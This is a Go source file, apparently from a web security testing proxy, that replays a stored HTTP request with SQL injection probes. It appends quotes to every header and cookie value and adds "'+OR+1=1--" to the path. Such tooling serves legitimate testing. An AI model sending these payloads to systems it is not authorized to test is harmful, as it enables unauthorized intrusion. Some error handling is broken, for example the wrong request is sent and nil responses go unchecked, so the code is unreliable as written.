package injector

import (
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"sa/internal/app/store"
	"strings"

	"github.com/sirupsen/logrus"
)

func prepareRequest(store *store.Connection, reqid string) *http.Request {
	doc := store.GetByRequestResponseReqId(reqid)
	if doc == nil {
		logrus.Infof("[InjectByReqId] cannot get request response")
		return nil
	}

	req := doc.Request_
	hdr := &http.Header{}
	// copy header
	for key, value := range req.Header {
		hdr.Add(key, value+"'")
	}

	hdr.Del("Proxy-Connection")
	hdr.Add("Connection", "Keep-Alive")

	up, _ := url.Parse(req.Url)
	scheme := "https"
	if up.Scheme != "" {
		scheme = up.Scheme
	}

	r := &http.Request{
		Method: req.Method,
		Host:   up.Host,
		URL: &url.URL{
			Scheme: scheme,
			Host:   up.Host,
			Path:   req.Path + "'+OR+1=1--",
		},
		Header: *hdr,
		Body:   io.NopCloser(strings.NewReader(req.Body)),
	}

	// copy cookie
	for key, value := range req.Cookies {
		r.AddCookie(&http.Cookie{
			Name:  key,
			Value: value.(string) + "'",
		})
	}

	return r
}

func doHttpRequest(r *http.Request) *http.Response {
	req, err := http.NewRequest(r.Method, r.URL.String(), r.Body)
	if err != nil {
		logrus.Infof("[doHttpRequest] 1 %s", err.Error())
		return nil
	}

	req.Header = r.Header
	response, err := http.DefaultTransport.RoundTrip(r)
	if err != nil {
		logrus.Infof("[doHttpRequest] 2 %s", err.Error())
		return nil
	}
	return response
}

func InjectByReqId(r *http.Request, w http.ResponseWriter, store *store.Connection) http.ResponseWriter {
	pathParts := strings.Split(r.URL.Path, "/")
	reqid := pathParts[len(pathParts)-1]

	r = prepareRequest(store, reqid)
	resp := doHttpRequest(r)
	w.WriteHeader(resp.StatusCode)
	defer resp.Body.Close()
	byt, _ := ioutil.ReadAll(resp.Body)

	w.Write(byt)
	return w
}
